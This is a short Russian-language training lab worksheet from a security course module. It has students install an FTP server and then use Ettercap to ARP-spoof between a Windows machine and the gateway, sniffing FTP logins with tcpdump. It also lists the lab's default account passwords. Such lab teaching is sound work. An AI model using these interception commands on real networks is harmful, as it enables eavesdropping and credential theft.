---
Практическая работа:
    Название: 'Анализ информационных систем предприятия с точки зрения безопасности'
    Действие: 'Модуль Второй'
---
# **Ettercap**


Имена пользователей и пароли:
```
Для denian
login: student 
password: 111
```
```
Для Windows
login: Admin 
password: Pa55w.rd
```
### **Практическая работа**

Сервер FTP

Установка и запуск сервиса

```
nano /etc/hosts
```
Заменить
```
127.0.1.1 server.corp.ru server
```
Установка FTP 
```
root@server:~# apt install proftpd-basic

```

Утилита ettercap на LAN

Установка

```
lan# apt install ettercap-text-only
```

ARP спуфинг
```
win arp -a
```
```
lan# ettercap -T -M arp //192.168.100.<ip windows> // //192.168.100.1//
```
```
win arp -a
```
```
lan# tcpdump -n -s0 -A port 21
```

Произвести подключение к FTP и посмотреть трафик
